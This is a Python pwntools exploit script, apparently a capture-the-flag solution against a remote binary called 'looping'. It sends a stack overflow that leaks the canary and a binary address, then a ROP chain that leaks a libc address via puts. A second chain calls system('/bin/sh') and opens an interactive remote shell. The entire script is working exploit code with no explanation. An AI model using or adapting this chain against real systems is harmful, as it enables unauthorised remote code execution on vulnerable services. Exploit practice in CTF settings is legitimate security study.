from pwn import *


p = remote("35.223.244.247", 49154)
#p = process("./looping",env={"LD_PRELOAD" : "./libc.so.6"})

p.sendline("A"*72)
pause(1)

leaks = p.recv().split()
binary_leak = u64(leaks[1][7:].ljust(8, "\x00"))
print(hex(binary_leak))
binary_base = binary_leak - 0x990
main = binary_base + 0x88a
puts = binary_base + 0x710
puts_got = binary_base + 0x200fa8
pop_rdi = binary_base + 0x9f3
ret = binary_base + 0x980
canary = u64(leaks[1][:7].rjust(8, "\x00"))
print(hex(canary))

try:
    p.sendline("A"*72 + p64(canary) + "A"*8 + p64(ret) + p64(pop_rdi) + p64(puts_got) + p64(puts) + p64(main))
except:
    log.error("leak error")
    exit()

sleep(2)
leaks = p.recv().split()
print(leaks)
libc_leak = u64(leaks[2].ljust(8, "\x00"))
print(hex(libc_leak))
libc_base = libc_leak - 0x80aa0
system = libc_base + 0x4f550
binsh = libc_base + 0x1b3e1a
log.info("canary: " + hex(canary))
log.info("binary_base: " + hex(binary_base))
log.info("libc_base: " + hex(libc_base))

p.sendline("A"*72 + p64(canary) + "A"*8 + p64(pop_rdi) + p64(binsh) + p64(system))

p.sendline("X")

log.warning("getting shell...")

p.interactive()
